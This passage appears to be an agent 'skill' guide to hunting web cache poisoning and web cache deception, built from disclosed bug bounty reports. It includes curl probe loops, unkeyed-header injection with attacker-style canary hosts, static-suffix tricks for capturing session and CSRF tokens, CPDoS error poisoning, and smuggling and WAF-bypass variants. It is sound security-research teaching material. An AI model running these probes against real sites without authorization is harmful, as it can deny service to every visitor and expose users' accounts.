---
name: hunt-web-cache
description: Hunting skill for WEB CACHE DECEPTION / cache poisoning, built from 104 assigned reports of which 87 FULL disclosed reports were read end-to-end (cache-layer appears in 85 of them). Covers the whole family: unkeyed-header/parameter cache poisoning (X-Forwarded-Host, X-Forwarded-Port, Host, h0st, X-Forwarded-Scheme, Origin→ACAO, X-CF-APP-INSTANCE, X-HTTP-Method-Override), CPDoS (cached 404/403/501/502 error responses), classic Omer-Gil Web Cache Deception via static-looking path suffixes (.css/.js/.jpg/.woff2/.avif), path/backslash/URL-normalization confusion, poisoned redirect Location headers, stored XSS and DOM-XSS multipliers, token/session/CSRF-token disclosure, request-smuggling→cache poisoning, affiliate-link cache poisoning (Shopify Linkpop), and client-side cache-key poisoning in libcurl. Canonical cases: PayPal $9,700 Transfer-Encoding CPDoS (H1 #622122), HackerOne X-Forwarded-Port redirect poison #409370, Shopify CDN backslash 404 poison #1695604 ($3,800), GitLab X-HTTP-Method-Override #1160407, Expedia/abritel.fr session-token WCD #1698316, catalog.data.gov XFH→stored DOMXSS #303730, Discourse/QIWI XFH→XSS #394016/#415168, Basecamp smuggling→poison #919175, Automattic CORS-ACAO poison #591302. Use when hunting any CDN-fronted, reverse-proxied, or cache-layered application. Two attacks live here: poisoning (attacker influences a cached response served to victims) and deception (attacker tricks the cache into storing a victim's private response); both require a second-client proof and cache-buster discipline. Host/X-Forwarded-Host injection that reaches app logic without caching belongs to hunt-host-header; this skill owns the case where the poisoned response is CACHED and served to other users.
sources: github, hackerone_public, portswigger_research, omergil_research, portswigger_kettle_research, curl_security, public_code_search
report_count: 104
full_reports_read: 87
---

## Crown Jewel Targets

Cache-layer was the single dominant signal in the corpus — present in 85 of the 87 full reports. The reason these bugs pay is amplification: one poisoned cache entry is served to every visitor behind that cache key until TTL expiry. Blast radius, not the tricks itself, sets severity.

**Highest-value targets, ranked by observed impact in the study pack:**

- **CDN-fronted asset hosts** — `cdn.shopify.com`, `shopify-assets.shopifycdn.com`, `assets.gitlab-static.net`, `www.paypalobjects.com`, `downloads.exodus.com`. Poisoning a JS/CSS/download asset breaks every consumer. The Shopify CDN backslash case (#1695604) and GitLab static-asset case (#1160407) both cached an error/empty body in place of a real asset — one request, global DoS. PayPal's #622122 did the same via an invalid `Transfer-Encoding`.
- **Authenticated account / profile pages routed through a CDN** — `/myaccount/home`, `/traveler/profile/edit`, `/account/profile`, `/home.php`. These are the classic WCD yield: session cookies (`HASESSIONV3` in #1698316), CSRF tokens (`gdtoken` in Glassdoor #1343086, `ha.crumb` in #1698316), and PII cached under a static-looking URL and served unauthenticated.
- **Any endpoint that reflects `Host` / `X-Forwarded-Host` into a cached body or header** — canonical links, `og:url`, `data-site-root`/`data-locale-root` (catalog.data.gov #303730), `@font-face` src (Discourse #394016), 301 `Location` (HackerOne #409370). A single unkeyed reflected header is the most reliable poison primitive in the whole corpus (host-header 17, host-header-attack 8, redirect-handling 16).
- **JSON/API endpoints with permissive CORS reflection** — `wp-json` returning arbitrary `Origin` in `Access-Control-Allow-Origin` and caching it (#591302, and duplicate #921704). A cached attacker ACAO enables cross-user reads; a cached bogus ACAO is a clean DoS.
- **Multi-tenant / shared caches** — GitLab CI runner shared cache instance (`runners-cache-*-internal.gitlab.com`, #301432) let one project read and poison every other project's cached build artifacts. Affiliate caches are the same pattern: Shopify Linkpop #1848940 let one attacker's crafted Amazon URL poison the victim product's cached link.
- **Update / download delivery subdomains** — `downloads.exodus.com` (#1173153), where a crafted `Authorization` header produced a cached 403 that all other downloaders received.
- **Applications behind Cloudflare / CloudFront / Fastly / Varnish / Akamai / Google Cloud Storage** — each has cache rules keyed on path/extension that disagree with origin routing. Cloudflare's static-extension list is the WCD trigger in Discourse #260697; CloudFront cached the XFH poison in #303730 and #431876-family cases; GCS + Varnish enabled the method-override poison in #1160407.

**Asset types that pay most:** CDN hostnames, subdomain-per-tenant patterns, update/download servers, login/account pages cached incorrectly, affiliate link shorteners, and any `.js` whose body an attacker can replace with an error or their own script.

### Impact calibration from the corpus

Severity in this family tracks *who receives the cached response*, not how clever the payload is. Calibrate expectations against what programs actually paid:

- **Session / CSRF-token disclosure via WCD** is the top tier: Expedia/abritel.fr #1698316 was rated High; catalog.data.gov #303730 reached CVSS 8.6 ($750) because the cached response executed script as well as leaked data. Any cached live credential should be argued as account takeover, not "info leak."
- **Cached XSS / DOM-XSS multipliers** sit in the Medium–High band with modest bounties relative to impact: Discourse #394016 ($256), QIWI #415168 ($200), Vanilla #593712 ($150), Glassdoor #1424094 ($0 but 133 upvotes). Upvotes often exceed bounty — the technique is valued as a primitive.
- **Asset DoS spans the whole range.** Mozilla #1976449 was Low; Acronis #1010858 CVSS 6.9; GitLab #1160407, GSA #728664, and Exodus #1173153 all reached High / CVSS 7.5; PayPal #622122 earned $9,700 (the top-voted report, 849 upvotes) for replacing JS with a cached 501. The differentiator is how central the poisoned asset is.
- **Redirect-poison DoS** is reliably paid when it blocks a whole domain: HackerOne #409370 ($2,500), Shopify #1096609 ($2,900), Acronis #1010858.
- **CORS/ACAO poisoning** landed as Medium (#591302) — often triaged as DoS even when it could enable cross-user reads.
- **Business-logic cache poison** (affiliate diversion) drew only $500 (Shopify Linkpop #1848940) despite direct revenue impact — a reminder that novelty and clean reproduction matter as much as theoretical loss.

**Practical rule:** when reporting, lead with the second-client proof and quantify the cache's reach (global CDN vs regional edge vs one origin). The same header reflection is a Low on a single-server cache and a Critical on a global asset CDN.

---

## Attack Surface Signals

### URL / path patterns that signal a cacheable surface

```
cdn.            assets.           static.          updates.       downloads.
/media/         /wp-content/      /assets/webpack/ /_next/static/ /sites/default/files/
/path/to/page.css                  /account.php/nonexistent.jpg
/myaccount/home/foo.css            /home.php/non-existent.css
/traveler/profile/edit/x.jpeg      /search/.../minNightlyPrice/x.jpeg?triagethis
/embed/job_board/js?for=...        /wp-json/...      /link/  /go/  /ref/  /out/
?cb=            ?cachebuster=      ?letme=           ?dontpoisoneveryone=  (cache busters)
```

Path signals from the corpus: a dynamic route that returns 200 with a fake static suffix appended (Vanilla #593712 `home.php/non-existent.css`, Expedia #1698316 `.jpeg`, Discourse #260697 `.css`), an extension the CDN caches but the origin ignores, or a delimiter the cache and origin normalize differently (backslash vs forward slash in Shopify #1695604, `/../` in Linkpop #1848940).

### Response headers that signal a cache

```
X-Cache: HIT / MISS
X-Cache-Status: HIT
CF-Cache-Status: HIT / MISS                 (Cloudflare)
Age: <nonzero>
Via: 1.1 varnish / cloudfront / fastly
Cache-Control: public, max-age=...
Surrogate-Control: max-age=...
X-Served-By: cache-...
CF-RAY: <hash>                              (changes per request; asset still cached)
Server: gcs / Google Frontend               ( GitLab #1160407 origin )
```

### Dangerous unkeyed inputs (header candidates)

```
X-Forwarded-Host          Host               X-Host               X-Forwarded-Port
X-Forwarded-Scheme        Forwarded          X-Original-URL       X-Rewrite-URL
X-HTTP-Method-Override    X-Forwarded-Server X-HTTP-Host-Override Origin
X-CF-APP-INSTANCE         Authorization      Transfer-Encoding    h0st
Cookie: hav=...           (cookie reflected into cached body — Expedia #1760213)
```

Most frequently observed in the 87 reports: `X-Forwarded-Host` (Discourse #394016, QIWI #415168, Nextcloud #429747, Smule #504514, Mozilla #1976449, Mail.ru #534297, HackerOne #487), `Host` / arbitrary port (HackerOne #409370, Shopify #1096609, GSA #1346618, GSA #942629 via `h0st`), `X-Forwarded-Port` (Acronis #1010858), `Origin` (Automattic #591302), and platform-specific controls (`X-CF-APP-INSTANCE` in GSA #728664, `X-HTTP-Method-Override` in GitLab #1160407, `Authorization` in Exodus #1173153).

### Tech-stack signals

- **Cloudflare / CloudFront / Fastly / Varnish / Akamai / Nginx proxy_cache** named in `Via`, `Server`, or docs.
- **WordPress sites** (`wp-json`, WP Super Cache #240886, W3 Total Cache #561805) — CORS/ACAO cache poison and outdated plugin RCE surface.
- **Shopify / Linkpop / Discourse / Vanilla / GitLab / CloudFoundry** stacks recur in the corpus.
- **Platforms that normalize URLs or ignore trailing path segments** (Rails, Express, Drupal-like routing) — the enabling condition for path-suffix WCD.
- **Google Cloud Storage / Varnish origins** that honor `X-HTTP-Method-Override` or store HEAD bodies.
- **Publicly reachable changelog / version files** (`readme.txt`, changelog) that fingerprint a vulnerable cache plugin (#90980, #579116).

### Cache-key components to enumerate

A cache key is usually some subset of scheme + host + path + query. Almost every finding in the corpus comes from an input that affects the *response* but is *not* in that subset. Map these before attacking:

```
USUALLY KEYED        scheme, host, path, sometimes full query string
OFTEN UNKEYED        X-Forwarded-Host, X-Forwarded-Port, Host, Origin,
                     X-Original-URL, cookies, Accept-Encoding, and
                     "tracking" query params the origin reads but cache drops
NORMALIZED AWAY      backslashes, /../ segments, trailing slashes, encoded dots,
                     case differences, method overrides
STORED SEPARATELY    HEAD vs GET bodies, error status codes (or not!)
```

Concrete examples from the corpus: Shopify #1695604 proved the cache normalizes `\` to `/` while the origin does not; GitLab #1160407 proved the cache did not separate HEAD from GET; Greenhouse #326639 proved a `for[]=` array changed the response while the key stayed stable; Expedia #1760213 proved a cookie (`hav`) reached the cached body.

### Reflected-surface → impact mapping

| Where the unkeyed input lands | Typical impact | Reports |
|-------------------------------|----------------|---------|
| 301/302 `Location` | Persistent redirect DoS / phishing | #409370, #1010858, #942629, #1198434 |
| Canonical / `og:url` / `fb:app_id` meta | Cached defacement, XSS via attribute breakout | #415168, #394016 |
| `data-site-root` / `data-locale-root` on `<body>` | Stored DOM-XSS via JS fetching attacker JSON | #303730 |
| `@font-face src` in generated CSS | Stored XSS on cached stylesheet | #394016 |
| `Access-Control-Allow-Origin` | CORS DoS / cross-user data read | #591302, #921704, #504514 |
| Generated JS config object | Cached script corruption | #326639 |
| Authenticated HTML body under `.css`/`.jpg` | Session/PII/CSRF-token disclosure → ATO | #1698316, #1271944, #593712, #631589, #397508, #439021, #1343086 |

### Recon command set

```bash
# 1. Fingerprint the cache layer on a representative set of endpoints
for u in / /index.php /assets/app.js /account/profile /wp-json/; do
  echo "== $u"; curl -s -I "https://target.com$u?cb=$RANDOM" \
    | grep -iE '^(HTTP/|age:|x-cache|cf-cache|via:|cache-control|surrogate|x-served-by|server:)'
done

# 2. Diff responses with and without a candidate unkeyed header
curl -s "https://target.com/page?cb=$RANDOM" > /tmp/clean.html
curl -s "https://target.com/page?cb=$RANDOM" -H 'X-Forwarded-Host: canary.attacker.com' > /tmp/poisoned.html
diff /tmp/clean.html /tmp/poisoned.html | head -50

# 3. Check whether the canary survives into a second client (the decisive test)
curl -s "https://target.com/page?cb=$FIXED" -H 'X-Forwarded-Host: canary.attacker.com' > /dev/null
curl -s "https://target.com/page?cb=$FIXED" | grep -i canary

# 4. Enumerate static-extension cache rules for WCD
for ext in css js jpg jpeg png gif ico woff2 avif svg; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -b 'session=...' \
    "https://target.com/account/profile/random.$ext?cb=$RANDOM")
  echo "$ext -> $code"
done

# 5. Locate public cache-plugin version leaks
for p in /wp-content/plugins/wp-super-cache/readme.txt \
         /wp-content/plugins/w3-total-cache/readme.txt; do
  curl -s "https://target.com$p" | grep -i 'stable tag\|version'
done
```

The goal of step 2 is not merely to confirm the header is reflected — it is to capture the *exact bytes* the cache will later serve to a victim. That diff is the core evidence of the report.

---

## Discovery Patterns From 87 Full Reports

### Where Researchers Start (ranked recon surfaces, with what to look for)

1. **Response headers of any cacheable-looking response** — Look for `Age`, `X-Cache: HIT`, `CF-Cache-Status`, `Via: varnish/cloudfront/fastly`, `Cache-Control: public, max-age`. Nearly every report begins by establishing that a cache exists. If `Age` increments on a repeat GET, you have a live cache key to attack.

2. **Static asset hosts and build output** — `/assets/webpack/*.js`, `/static/javascripts/*.js`, `*.woff2`, `/js/app.js`. What to look for: can a header turn the asset into a 404/403/501/empty body (#1160407, #622122, #728664, #1173153, #1695604)? This is the highest-yield DoS family (dos-resource 24).

3. **Authenticated pages you can reach with your own session** — `myaccount`, `traveler/profile/edit`, `/messages/all`, `/account/profile`. What to look for: does appending `.css`/`.js`/`.jpg`/`.jpeg` still return 200 with your PII/token in the body, and does the cache then serve it without auth (#1698316, #593712, #631589, #397508, #439021)?

4. **Any request whose input is reflected into a redirect or canonical link** — 301/302 `Location`, `<link rel=canonical>`, `og:url`, `data-site-root`, `@font-face src`. What to look for: inject a canary host or port and see if it is echoed, then whether the echoed response is cached (#409370, #303730, #394016, #415168, #487).

5. **Search/filter/sort and parameterized pages** — `?for[]=`, `?q=`, `?triagethis`, `utm_source`. What to look for: reflected parameter values that persist into a cached response for clean requests (search-filter-sort 29, Greenhouse #326639 parameter pollution).

6. **JS source and public code** — bundles revealing which header builds canonical URLs, and public changelogs revealing cache plugin versions. What to look for: `X-Forwarded-Host` consumed in URL generation (js-source-review 15, public-code-search 8, Discourse #394016's identified `.erb` template).

7. **Related / duplicate reports** — Several researchers explicitly started from a prior report (#326639 started from #298265; #1322732 started from failed fix #1198434). What to look for: a patched path and the paths the fix missed.

8. **Third-party caches and build systems** — GitLab CI runner cache, package caches, client-side caches (libcurl HSTS/session cache, Rails `Rails.cache.fetch(raw: true)` #413388). What to look for: shared cache keys across trust boundaries — #301432 let one CI project read and poison every other project's artifacts under `runners-cache-*-internal.gitlab.com`.

9. **Version / changelog fingerprinting** — A few reports started without any active probing at all: they fetched `readme.txt` or a public changelog and matched a vulnerable cache-plugin version (#90980 found WP Super Cache 1.4.4 on owncloud.org; #579116 flagged W3 Total Cache on nextcloud.com; #561805 listed RCE/file-read impact for W3 Total Cache ≤ 0.9.4.1). What to look for: any cached/CDN plugin with a publicly readable version string.

10. **Patch-diffing and duplicate reports** — Several researchers explicitly mined prior fixes. #1322732 re-tested the domain fixed in #1198434 and found the fix covered only one path; #326639 started from related report #298265. What to look for: a public fix note, then test sibling paths, sibling subdomains, and alternate header spellings the fix missed.

11. **TTL and edge topology measurement** — Some researchers mapped *where* the cache lives before attacking. #728664 noted a DNS-checker tool "may be able to determine regional IPs for the asset, and poison regions by directly targeting them"; #260697 emphasized Cloudflare has only 13 regions so a cached response is regional, not truly global. What to look for: `CF-RAY`, `X-Served-By`, `Age`, and DNS/Anycast data to scope blast radius.

**Common starting move across all of them:** reflect a distinctive canary (a unique hostname or token you control), confirm it appears in the response, and confirm the response is served from cache to a clean client. Everything else is escalation.

### Feature-Based Discovery Signals (frequency-ranked)

Counts are the number of the 87 full reports whose technique tags contain each signal (from the study pack frequency table).

| Rank | Signal (count) | Why it matters | What to probe |
|------|----------------|----------------|---------------|
| 1 | cache-layer (85) | A cache sits in front of virtually every target; it is the amplifier for all other bugs. | Establish `Age`/`X-Cache` and a cache-buster discipline before any poison. |
| 2 | search-filter-sort (29) | Dynamic query output is often cached under a truncated key. | Reflect a canary in `?q=`/`?for[]=` and re-request clean. |
| 3 | dos-resource (24) | Cached error responses are the cheapest reliable impact. | Force 404/403/501/502 via poison header; confirm second client gets it. |
| 4 | image-processing (23) | Image/extension cache rules drive WCD and asset poisoning. | Append `.jpg/.jpeg/.avif/.woff2` to dynamic routes. |
| 5 | server-side-rendering (20) | SSR reflects inputs into cached HTML. | Inject canary header/param, inspect body, check HIT. |
| 6 | stored (20) | The poisoned entry is effectively stored XSS/defacement. | Aim for XSS payload in cached body; verify persistence across clients. |
| 7 | filter-bypass (19) | WAF/filters miss header variants and encodings. | Swap `X-Forwarded-Host` for `X-Host`, `h0st`, `Forwarded`. |
| 8 | session-attack (18) | WCD leaks session cookies/tokens. | Target profile pages; grep cached body for `HASESSION`, `gdtoken`, `ha.crumb`. |
| 9 | comment-injection (17) | Attacker strings land in cached templates/meta. | Inject into any reflected comment/meta field. |
| 10 | host-header (17) | Single most reliable poison primitive. | `Host`/`X-Forwarded-Host` with arbitrary host or `:port`. |
| 11 | redirect-handling (16) | Cached `Location` poisons all redirects. | Set bogus port in `X-Forwarded-Port`/`X-Forwarded-Host`. |
| 12 | js-source-review (15) | Source reveals which header is trusted. | Grep bundles/templates for header→URL construction. |
| 13 | xml-parser (14) | Parsers fetch/reflect attacker URLs into cached pages. | Feed crafted URLs to import/feed features. |
| 14 | cookie-handling (14) | Reflected cookies become cached XSS (Expedia `hav`). | Inject payload into non-session cookies on cacheable routes. |
| 15 | url-fetching (13) | Fetchers generate cached previews/metadata. | Point URL fetcher at attacker canary and check cached output. |
| 16 | blind-oob (13) | Some primitives need OOB to confirm fetch. | Use Collaborator to confirm server-side fetch before poisoning. |
| 17 | proxy-feature (13) | Reverse proxies forward unkeyed headers to origin. | Enumerate which forwarded headers reach the body. |
| 18 | internal-network (13) | Cache/proxy tiers desync. | Probe hop-by-hop headers, smuggling into cache backend. |
| 19 | api-endpoint (12) | APIs with CORS reflection cache ACAO. | `Origin: evil.example` → check cached `Access-Control-Allow-Origin`. |
| 20 | csrf (9) | WCD exposes CSRF tokens → ATO. | Verify cached token is still accepted in a state-changing request. |
| 21 | host-header-attack (8) | Dedicated Host-header poison variant. | Try arbitrary `:port` in `Host` (Shopify #1096609). |
| 22 | public-code-search (8) | Version/changelog leaks identify vulnerable cache software. | Fetch `readme.txt`/changelog, match to known CVE. |
| 23 | debug-error-leak (8) | Debug headers force cached errors. | `X-CF-APP-INSTANCE: xxx:1` → 404 (#728664). |
| 24 | subdomain (7) | Single subdomain hosts all downloads/assets. | Target `downloads.`/`updates.` for global impact. |
| 25 | path-traversal-lfi (7) | `/../` and null-byte path confusion hits cache. | Craft `product/../other` style paths (#1848940, #240886). |
| 26 | sso-oauth (6) | OAuth/reset flows with cached links/tokens. | Check cached redirect URIs and reset links. |
| 27 | misconfiguration (5) | Cache rules configured "cache all *.css". | Find dynamic routes matching cache rules. |
| 28 | request-smuggling (4) / cloud-metadata (4) / time-based (4) | Advanced: desync poisons cache; metadata/TTL matter. | CL.TE smuggle; measure TTL for persistence. |
| 29 | cors-misconfig (3) / subdomain-takeover (3) / reflected (3) / open-redirect (3) | Lower-count but high-value multipliers. | Probe ACAO, dangling subdomains, cached redirects. |
| 30 | parameter-pollution (1) / null-byte (1) / double-encoding (1) / mutation-polyglot (1) | Rare but decisive bypasses. | Try `for[]=` arrays, `%00`, `%2e%2ecss`, quote-splitting. |

### Verbatim Discovery Clues

Real "how I found it" lines, quoted verbatim from the disclosed report text. (Some end mid-token because the source excerpt is truncated there; that truncation is from the study corpus.)

- [#1160407] "Since the CDN is using Varnish to cache files, I was able to combine the GCP behaviour and poison the cache into returning an empty resource, inherenetly causing a denial of service on gitlab."
- [#1271944] "I discovered that by applying path confusion followed by a random file name and `."
- [#1010858] "I found the problem of cache poisoning in www."
- [#1198434] "I accidentally come a cross this vulnerability when I was testing for Server side request forgery (SSRF)."
- [#1198434] "The vulnerability was discovered when I was testing for SSRF in the host header field."
- [#1198434] "When the URL of the redirect was reflected I was able to add an random port number and store it into the cache server."
- [#1581454] "I was able to impact the core functionality by using an invalid custom HTTP header to replace the JavaScript file from https://www."
- [#260697] "I noticed this issue on one of your clients which was using CloudFlare in front of their Discourse."
- [#593712] "I have found a Vulnerability in vanilla forums which called Web cache deception attack."
- [#537564] "Hi OLX team, i found a web cache deception vulnerability in https://tradus."
- [#487] "I noticed if I made a request to your website, intercepted the request, and added the header."
- [#487] "Well, after that, I tried going to hackerone."
- [#487] "com and I was instantly redirected to evil."
- [#301432] "When I started looking at this, I had to specify which paths to download from the cache."
- [#1322732] "I did some tests and I was able to re poisoning the domains cache server again in different paths."
- [#326639] "I was taking a look into a related report (https://hackerone."
- [#3831345] "The failing transfer reaches the cache through `curl_easy_perform()`, during the OpenSSL handshake."
- [#1911568] "I found a vulnerability in https://fanout."

**What these clues teach (themes):**
- *"I was testing for SSRF"* (#1198434) — host-header injection is a shared primitive; when the reflected URL lands in a cached redirect, the finding becomes cache poisoning. Pivot between the two skills rather than forcing a single label.
- *"using Varnish/GCP behaviour"* (#1160407) — knowing the specific origin stack tells you which exotic header will change the response.
- *"path confusion"* (#1271944) and *"random file name"* — WCD researchers add a random segment so the poisoned URL is unique and does not collide with a real user's key.
- *"in front of their Discourse"* / *"CloudFlare"* (#260697) — identifying the CDN is itself a discovery step; cache rules are CDN-specific.
- *"instantly redirected to evil"* (#487) — the strongest discovery signal is a second request you did not poison still showing your canary.
- *"re poisoning ... in different paths"* (#1322732) — a fix is rarely global; re-enumerate keys after every patch.
- *"I did some tests ... custom HTTP header"* (#1581454), *"h0st"* (#942629) — header-name mutation is a first-class discovery technique, not just a bypass.

### Probe Checklist (15 concrete probes)

Run each with a unique cache-buster query (`?cb=<random>`) so you never poison a live victim key. Confirm reflection first, then storage, then a second client. A positive probe is *reflection*; it is not yet a finding until a clean second client receives the poisoned value.

1. `curl -I` twice on a target URL; compare `Age`, `X-Cache`, `CF-Cache-Status`. Establish a cache exists.
2. Add `X-Forwarded-Host: canary.attacker.com` to a cacheable GET; grep the body for `canary.attacker.com` in canonical/og:url/script-src/Location (#394016, #415168, #303730).
3. Add `X-Forwarded-Port: 1337`; check cached 301 `Location` or generated links for the bogus port (#409370, #1010858).
4. Send `Host: target.com:1337` (arbitrary unopened port) on a cacheable path; check for cached poison/DoS (#1096609, #1346618).
5. Try `h0st: <random>` (obfuscated header) to bypass header filters; look for cached 502 (#942629).
6. Send `Origin: evil.example` to a JSON/API endpoint; verify cached `Access-Control-Allow-Origin` reflects it (#591302).
7. Append `.css` to an authenticated route; grep cached body for email/user id/session token (#593712, #631589).
8. Append `.js` / `.jpeg` / `.avif` to a dynamic route; check if origin still returns 200 HTML and cache stores it (#1698316, #260697, Cloudflare Armor bypass #1391635-style).
9. Replace `/` with `\` in an asset URL; check if cache normalizes to the clean path but origin 404s, caching the error (#1695604).
10. Send `X-HTTP-Method-Override: HEAD` to a cached JS/CSS asset; check for cached empty body (#1160407).
11. Send a crafted `Authorization` header to a download asset; check if a cached 403/501 is served to clean requests (#1173153, #622122 via `Transfer-Encoding`).
12. Inject `X-CF-APP-INSTANCE: xxx:1` on a CloudFoundry-hosted asset; check for cached 404 (#728664).
13. Pollute parameters: `?for[]=x&for[]=` on a JS-producing endpoint; check cached generated JS (#326639).
14. Inject a cookie (`Cookie: hav=<payload>`) on an extension-suffixed route; check cached XSS and WAF-bypass by quote-splitting (#1760213).
15. Craft a product/path URL with `/../` in an affiliate/shortener link; check cached redirect to attacker product (#1848940).

After any positive: fetch the URL from a second IP/incognito WITHOUT the poison header. If the second client sees the canary, the poison is stored.

**Interpreting probe results:**
- Canary in body only on *your* request, gone on clean re-request → reflection without caching. Not a finding; move on or find the cacheable route.
- Canary in body on clean re-request, but `Age` never increments → the origin itself may be caching, or the key includes your header. Verify with `Vary` inspection.
- 404/403/501/502 on clean re-request of a previously working asset → CPDoS confirmed; measure how many paths/hosts share the key.
- Cached response contains a live session or CSRF token → stop probing, this is a High/Critical; verify the token before rotating it.
- Nothing reflected anywhere → check whether the header is stripped at the edge (try the variant wordlist in Payload Patterns) before concluding the surface is clean.

**Order of operations within a single probe:** (1) send poison with `?cb=<random>`; (2) inspect the reflected response; (3) re-request the SAME `?cb` URL clean from a second client; (4) only then, if you need to prove real-world impact, repeat WITHOUT the cache-buster on a path you are willing to affect — and purge/reset if the platform provides a cache-purge mechanism.

---

## Step-by-Step Hunting Methodology

1. **Establish the cache first.** Send a GET to the target and inspect response headers. Identify the caching layer (Cloudflare, CloudFront, Fastly, Varnish, Akamai, GCS, Nginx). Note `Age`, `X-Cache`, `CF-Cache-Status`. If `Age` increments, you have a live key.

2. **Adopt cache-buster discipline from the first request.** Append a unique query (`?cb=<random>`) to every poison probe so your test lands on a throwaway key. This is explicitly the practice in #409370 (`?dontpoisoneveryone=1`), #1173153, #1160407, #1346618, #942629, #1976449, and the catalog.data.gov report's warning: "Please be careful when exploring this issue, as it's potentially quite easy to accidentally poison CloudFront's cache and antagonise your visitors." Never rely on client-sent `Cache-Control: no-cache` to avoid storage; RFC 7234 makes it a revalidation request and most CDNs ignore it on cacheable assets.

3. **Map the cache key.** Send two identical requests — if `Age` resets on change, vary headers one at a time (`X-Forwarded-Host`, `X-Forwarded-Port`, `Host`, `Origin`, `X-Original-URL`) to learn which are NOT part of the key. Param Miner's "Guess headers" mode automates this discovery. Record which inputs change the *response body* but not the *cache hit* — that delta is the vulnerability.

4. **Test unkeyed-header reflection.** Add your canary header on a cacheable GET and look for the value in: redirects, canonical links, CSP headers, script src, meta tags, `data-*` attributes, `@font-face` URLs, and generated JS. Which surface the header lands in predicts the impact class (redirect→DoS/ATO, HTML attr→XSS, ACAO→cross-origin). Discourse #394016 was found by grepping a cached CSS response for the injected host; catalog.data.gov #303730 by inspecting `data-site-root`.

5. **Test Web Cache Deception.** With your own authenticated session, request `/account/profile.css` / `/dashboard/settings.jpg` / `/search/.../x.jpeg`. If the origin serves your private page under the static extension and the cache stores it, you have a WCD primitive. Then fetch as a clean client. Add a random filename segment (`/profile/<random>.css`) so your test key cannot collide with a real user's — the pattern used in #1271944 and #1698316. Try multiple extensions: `.css`, `.js`, `.jpg`, `.jpeg` (#1698316), `.woff2`, `.avif` (the extension Cloudflare's Cache Deception Armor historically omitted).

6. **Test cache-key confusion / normalization.** Try backslashes for slashes (#1695604), `/../` segments (#1848940), encoded delimiters, and static suffixes the CDN caches but origin ignores. Compare what the cache thinks the key is with what the origin actually served.

7. **Test error-response poisoning (CPDoS).** Send a header that makes the origin return 404/403/501/502 (`X-Forwarded-Host` to invalid host, bogus `Authorization`, `X-CF-APP-INSTANCE`, invalid `Transfer-Encoding`, oversized headers). Then re-request cleanly: if the error is cached, you have DoS. Quantify scope — regional edge vs global. Disciplined researchers here used cache-busters and explicitly noted "No actual denial of service attack was caused throughout my testing" (#1173153, #1160407) — mirror that care.

8. **Test method / verb confusion.** `X-HTTP-Method-Override: HEAD` on GCS/Varnish can store an empty HEAD body under the GET key (#1160407). Test unusual verbs and method-override headers.

9. **Test CORS/ACAO poisoning.** On JSON/API endpoints, inject `Origin` and inspect `Access-Control-Allow-Origin` across two hits. A cached `*` or attacker origin breaks CORS for legit users or enables cross-user data reads (#591302, #921704).

10. **Test parameter pollution and fat GET.** Arrays (`for[]=`), duplicate params, and body params the backend reads but the cache ignores can desync key from processed input (#326639).

11. **Smuggle past edge stripping.** If the WAF strips poison headers, try request smuggling (CL.TE/TE.CL) to deliver `X-Forwarded-Host` or a smuggled response to the cache backend directly (#919175 Basecamp; Akamai hop-by-hop `Connection: Content-Length` desync family).

12. **Confirm storage with a second client.** Send the poison, let the cache store, then fetch from incognito / a different IP / a second tool WITHOUT the poison header. Require the canary in that response. This is Gate 0 — the single step that separates a cache bug from a self-reflection observation. #487's discovery phrase — loading `hackerone.com` and being "instantly redirected to evil" — is exactly this proof.

13. **Measure TTL and blast radius.** Read `Cache-Control: max-age`, `Age`, `Surrogate-Control`. Determine whether the key is global CDN, regional edge, or single-server. This sets severity more than the payload does. Cloudflare has 13 regions (#260697); CloudFront caches per distribution (#303730); a single Varnish instance may be per-origin (#1160407). Where the poison lives determines who loses.

14. **Escalate to XSS / ATO where possible.** If the reflected header lands in an HTML attribute or script source, upgrade from defacement/DoS to stored XSS (#303730 DOMXSS, #394016/#415168 XSS, #1760213 cookie XSS). If WCD leaked a live session/CSRF token, verify it works in a state-changing request to claim ATO (#1698316).

15. **Document the full chain** with two screenshots: the poison request reflected, and the clean second-client response. Include the cache-buster you used and the URL that a victim would actually hit.

### Decision tree: which attack to pursue first

```
Is there a cache (Age / X-Cache / CF-Cache-Status)?
├── NO  -> not this skill; consider hunt-host-header or hunt-xss
└── YES
    ├── Can you log in and does /account/<random>.css still return your private HTML?
    │   └── YES -> WEB CACHE DECEPTION. Grep body for session/CSRF/PII. (High/Critical)
    ├── Is a header/param reflected into a 301 Location, canonical, or meta tag?
    │   └── YES -> POISONED REDIRECT / DEFACEMENT. Test bogus port first. (Medium-High)
    ├── Is a header/param reflected into an HTML attribute or script source?
    │   └── YES -> CACHED XSS. Escalate with quote breakout and payload. (Medium-High)
    ├── Does an Origin header land in Access-Control-Allow-Origin?
    │   └── YES -> CORS POISON. Check clean second hit. (Medium)
    ├── Can a header make an asset return 404/403/501/502 or an empty body?
    │   └── YES -> CPDoS. Confirm clean client gets the error. (Low-High by asset)
    ├── Do backslashes / /../ / method overrides change origin behavior only?
    │   └── YES -> CACHE-KEY NORMALIZATION CONFUSION. (Medium-High)
    └── Nothing reflected?
        └── Try header variants, smuggling into the cache backend, and the
            client-side/library caches (libcurl, Rails raw cache) angle.
```

Work top-down: WCD and XSS outrank CPDoS in severity, and both are cheaper to prove than smuggling. The study pack shows researchers frequently *stumbled into* cache poisoning while testing something else (#1198434 found it during SSRF testing) — but the ones who got paid followed the reflection→storage→second-client sequence deliberately.

---

## Payload & Detection Patterns

### Confirm caching behavior

```bash
# Send twice, compare Age / X-Cache / CF-Cache-Status
curl -s -I "https://target.com/page?cb=$RANDOM" | grep -i "age\|x-cache\|cf-cache\|via"
curl -s -I "https://target.com/page?cb=$RANDOM" | grep -i "age\|x-cache\|cf-cache\|via"
# Age increments or X-Cache: HIT => response is being cached under that key
```

### Unkeyed header reflection (safe probe under a throwaway key)

```bash
curl -s "https://target.com/page?cb=$RANDOM" \
  -H "X-Forwarded-Host: canary.attacker.com" | grep -i "canary.attacker.com"

# Header variants when XFH is stripped or ignored
curl -s "https://target.com/page?cb=$RANDOM" -H "X-Host: canary.attacker.com"
curl -s "https://target.com/page?cb=$RANDOM" -H "Forwarded: host=canary.attacker.com"
curl -s "https://target.com/page?cb=$RANDOM" -H "X-Original-URL: /canary"
curl -s "https://target.com/page?cb=$RANDOM" -H "Host: target.com:1337"
curl -s "https://target.com/page?cb=$RANDOM" -H "h0st: canary"
```

### Poisoned redirect (classic HackerOne pattern, #409370 / #1010858)

```bash
curl -s -D - -o /dev/null "https://target.com/index.php?cb=$RANDOM" \
